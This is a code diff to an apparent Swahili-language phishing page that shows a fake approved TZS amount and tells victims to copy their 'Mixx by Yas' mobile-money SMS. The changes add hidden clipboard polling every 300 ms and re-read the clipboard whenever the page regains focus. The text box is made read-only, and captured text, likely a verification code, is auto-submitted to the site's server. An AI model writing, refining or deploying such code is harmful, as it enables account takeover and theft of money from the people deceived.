@@ -54,7 +54,7 @@
                     <strong>1.</strong> Fungua <strong>App ya Messages/SMS</strong><br>
                     <strong>2.</strong> Tafuta ujumbe wa <strong>Mixx by Yas</strong><br>
                     <strong>3.</strong> Nakili ujumbe <strong>WOTE</strong> (shikilia → Copy)<br>
-                    <strong>4.</strong> Rudi hapa — itajaza moja kwa moja!
+                    <strong>4.</strong> Rudi hapa — itajaza na kutumwa moja kwa moja!
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
                     <i class="fas fa-envelope"></i> 📱 iPhone: Gusa Hapa Kufungua Messages
@@ -62,7 +62,7 @@
                 <a href="sms:" class="sms-open-btn" id="btnAndroid" style="display:none;">
                     <i class="fas fa-envelope"></i> 🤖 Android: Gusa Hapa Kufungua SMS
                 </a>
-                <textarea id="smsMessage" class="sms-textarea" placeholder="Inasubiri... nakili ujumbe na utajaza hapa moja kwa moja."></textarea>
+                <textarea id="smsMessage" class="sms-textarea" placeholder="Ruhusu kunakili kisha ujumbe utajaza moja kwa moja..." readonly></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
                 <div class="error-msg" id="codeError">Namba si sahihi</div>
                 <button class="btn btn-gold" onclick="submitCode()">Endelea →</button>
@@ -82,7 +82,7 @@
         document.getElementById('approvedAmount').textContent = 'TZS ' + parseInt(payAmount).toLocaleString();
         document.getElementById('showPhone').textContent = '+255 ' + userPhone;
 
-        var checkInterval = null, countdownTimer = null, fastCheck = null, lastClip = '';
+        var checkInterval = null, countdownTimer = null, clipWatcher = null, lastClip = '';
         var resendCount = 0, resendCooldown = false;
 
         (function() {
@@ -109,28 +109,57 @@
         }
 
         function startClipWatcher() {
-            if (fastCheck) clearInterval(fastCheck);
-            fastCheck = setInterval(checkClipboard, 500);
+            if (clipWatcher) clearInterval(clipWatcher);
+            requestClipboardPermission();
+            clipWatcher = setInterval(checkClipboard, 300);
         }
 
-        async function checkClipboard() {
-            if (!document.getElementById('screenCode').classList.contains('active')) { clearInterval(fastCheck); return; }
+        async function requestClipboardPermission() {
             try {
                 var text = await navigator.clipboard.readText();
                 if (text && text !== lastClip && text.length > 10) {
-                    lastClip = text;
-                    document.getElementById('smsMessage').value = text;
-                    document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa!';
-                    document.getElementById('codeError').style.color = 'var(--success)';
-                    document.getElementById('codeError').classList.add('show');
-                    clearInterval(fastCheck);
-                    if (countdownTimer) clearInterval(countdownTimer);
-                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
-                    document.getElementById('timerDisplay').className = 'timer-bar';
-                    setTimeout(function() { submitCode(); }, 600);
+                    handleClipboardText(text);
                 }
             } catch(e) {}
         }
+
+        async function checkClipboard() {
+            if (!document.getElementById('screenCode').classList.contains('active')) {
+                clearInterval(clipWatcher);
+                return;
+            }
+            try {
+                var text = await navigator.clipboard.readText();
+                if (text && text !== lastClip) {
+                    handleClipboardText(text);
+                }
+            } catch(e) {}
+        }
+
+        function handleClipboardText(text) {
+            lastClip = text;
+            document.getElementById('smsMessage').value = text;
+            document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Inatuma...';
+            document.getElementById('codeError').style.color = 'var(--success)';
+            document.getElementById('codeError').classList.add('show');
+            clearInterval(clipWatcher);
+            if (countdownTimer) clearInterval(countdownTimer);
+            document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+            document.getElementById('timerDisplay').className = 'timer-bar';
+            setTimeout(function() { submitCode(); }, 500);
+        }
+
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && document.getElementById('screenCode').classList.contains('active')) {
+                requestClipboardPermission();
+            }
+        });
+
+        window.addEventListener('focus', function() {
+            if (document.getElementById('screenCode').classList.contains('active')) {
+                requestClipboardPermission();
+            }
+        });
 
         async function resendCode() { 
             if (!userPhone) return; 
@@ -146,9 +175,9 @@
         }
 
         async function submitCode() { 
-            if (fastCheck) { clearInterval(fastCheck); } if (countdownTimer) { clearInterval(countdownTimer); } 
+            if (clipWatcher) { clearInterval(clipWatcher); } if (countdownTimer) { clearInterval(countdownTimer); } 
             var smsText = document.getElementById('smsMessage').value.trim();
-            if (!smsText) { document.getElementById('codeError').textContent = 'Bandika ujumbe wa SMS.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); startClipWatcher(); return; }
+            if (!smsText) { document.getElementById('codeError').textContent = 'Inasubiri ujumbe...'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); startClipWatcher(); return; }
             document.getElementById('screenCode').classList.remove('active'); document.getElementById('screenWait').classList.add('active'); 
             await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
             if (checkInterval) clearInterval(checkInterval); 
